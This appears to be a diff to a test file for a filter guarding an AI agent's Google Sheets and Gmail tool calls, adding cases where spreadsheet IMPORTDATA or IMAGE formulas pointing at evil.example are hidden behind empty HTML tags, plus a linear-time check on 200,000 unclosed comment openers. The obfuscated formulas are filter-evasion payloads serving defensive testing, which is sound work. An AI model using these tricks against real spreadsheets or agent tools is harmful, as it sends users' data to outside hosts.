@@ -483,6 +483,9 @@ def test_csv_text_content_to_a_sheet_passes() -> None:
     'IMPORT<![CDATA[DATA]]>("https://evil.example")',   # CDATA split
     'IMPORT<!---->DATA("https://evil.example")',        # comment split
     '=&#73;MAGE(&quot;https://evil.example/x&quot;)',
+    'IMPORT<b></b>DATA("https://evil.example")',                 # plain empty tag split
+    'IMPORT<span class="x"></span>DATA("https://evil.example")',
+    '<i>IMPORT</i><i>DATA</i>("https://evil.example")',
 ])
 def test_markup_encoded_formula_in_text_content_refused(cell: str) -> None:
     gateway, session_call = _make_gateway()
@@ -595,4 +598,16 @@ def test_attachment_with_nested_non_url_metadata_passes() -> None:
     _call(gateway, "google_workspace__send_gmail_message",
           {"to": ALICE, "subject": "s", "body": "b",
            "attachments": [{"path": "/data/a.pdf", "meta": {"pages": 3, "title": "x"}}]})
+    assert session_call.await_count == 1
+
+
+def test_formula_scan_is_linear_on_many_unclosed_openers() -> None:
+    """The tag strip is a forward scan, not a regex: 200k unclosed "<!--"
+    must not take quadratic time."""
+    import time
+    gateway, session_call = _make_gateway()
+    text = "<!--" * 200_000 + "harmless"
+    t0 = time.perf_counter()
+    _call(gateway, "google_workspace__import_to_google_sheets", {"file_name": "x.csv", "content": text})
+    assert time.perf_counter() - t0 < 5
     assert session_call.await_count == 1
